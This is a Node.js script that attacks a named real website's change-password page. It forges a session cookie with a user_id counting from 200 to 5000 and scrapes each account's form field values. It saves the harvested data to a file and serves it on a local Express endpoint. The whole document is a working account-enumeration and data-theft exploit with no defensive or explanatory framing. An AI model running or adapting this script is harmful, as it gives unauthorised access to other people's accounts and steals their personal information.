var fs = require('fs');
const express = require('express');
const axios = require('axios')
const cheerio = require('cheerio');
const app = express();

const PORT = process.env.port || 3000;


const website = 'https://www.cupidbaba.com/your-account/change-password/';
let content = [];

let NumberVal = 200;


const getVV = async _ => {
    setTimeout(async () => {

        console.log(NumberVal);


        const res = await  axios(website, {
            headers: {
                Cookie: `msl-data=%7B%22user_id%22%3A%22${NumberVal}%22%2C%22user_name%22%3A%22Rohan%22%2C%22guest_user%22%3A0%7D`
            }
        })
        const $ = cheerio.load(res.data);
        $('.form-group', res.data).each(function () {
            const title = $(this).text().trim();
            const url = $(this).find('input').attr('value');
            if(url != '' && url != undefined) {
                content.push({
                    [title]: url
                  });
                let fileData = JSON.stringify(content)
           
                console.log('saving');
                fs.writeFile("JsonData.txt", fileData, function(err) {
                if (err) {
                    console.log(err);
                }
            });
            }
            app.get('/', (req, res) => {
              res.json(content);
            });
          });
        NumberVal += 1;
          if(NumberVal < 5001) { 
            getVV()
          }          
    
}, 5000)
}
 
getVV()
app.listen(PORT, () => {
  console.log(`server is running on PORT:${PORT}`);
});
